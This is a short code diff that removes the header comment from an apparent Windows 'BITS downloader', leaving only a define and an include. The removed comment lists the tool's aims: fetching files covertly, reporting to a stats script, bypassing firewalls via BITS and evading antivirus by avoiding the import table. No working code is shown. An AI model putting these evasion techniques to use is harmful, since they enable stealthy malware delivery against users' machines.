@@ -1,22 +1,4 @@
-/* 
-        0x48k BITS DOWNLOADER 
-        FEATURES 
-        - downloading manual number of files 
-        - report to stat script, if downloading success (for each file) 
-        - using BITS (Background Intelligent Transfer Service) for downloading 
-        - bypass most of firewalls (thanks to BITS =)) 
-    - not using import table, for better av-stealth) 
-        - small size (above 1.7k with FSG) 
-        PRIVATE SOURE CODE BY Cr4sh =\ 
-http://allmyhate.host.sk 
-        compile with Microsoft Visual C++ 
-     _ _     _ _ _ __     _      _   _       
-        | || |___| | | |/ /_ _ (_)__ _| |_| |_ ___ 
-        | __ / -_) | | ' <| ' \| / _` | ' \ _(_-< 
-        |_||_\___|_|_|_|\_\_||_|_\__, |_||_\__/__/ 
-             hellknights.void.ru |___/ .0x48k.   
-        t h e   m a i n e s t   e v i l   o f   r u n e t 
-*/ 
+
 //-------------------------------------------------------------------------------------- 
 #define _WIN32_WINNT 0x0500 
 #include <windows.h> 
